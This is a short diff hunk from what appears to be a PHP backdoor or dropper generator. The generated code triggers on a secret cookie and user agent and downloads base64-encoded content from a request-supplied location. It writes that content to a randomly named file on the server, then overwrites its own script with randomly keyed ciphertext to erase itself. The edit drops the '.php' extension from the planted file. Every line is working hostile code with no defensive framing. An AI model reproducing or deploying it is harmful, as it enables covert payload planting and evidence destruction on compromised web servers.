@@ -58,7 +58,7 @@ if (isset(\$_COOKIE['$this->cookie_name']) && \$_SERVER['HTTP_USER_AGENT'] === '
                 \$$this->random_uuid_var = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(\$$this->random_var), 4)).PHP_EOL.PHP_EOL;
             }
             echo \$$this->random_uuid_var . "_$this->randomized_name".PHP_EOL;
-            fputs(fopen('./$this->randomized_name.php', 'a+'), base64_decode(file_get_contents(\$_SERVER['$this->post_variable'][2])));
+            fputs(fopen('./$this->randomized_name', 'a+'), base64_decode(file_get_contents(\$_SERVER['$this->post_variable'][2])));
             foreach (file(\$_SERVER['SCRIPT_FILENAME']) as \$line){
                 fwrite(fopen(\$_SERVER['SCRIPT_FILENAME'], 'w'), openssl_encrypt(\$line, 'aes-256-ctr', bin2hex(openssl_random_pseudo_bytes(100)), OPENSSL_RAW_DATA|OPENSSL_NO_PADDING|OPENSSL_ZERO_PADDING, openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-ctr'))));
             }
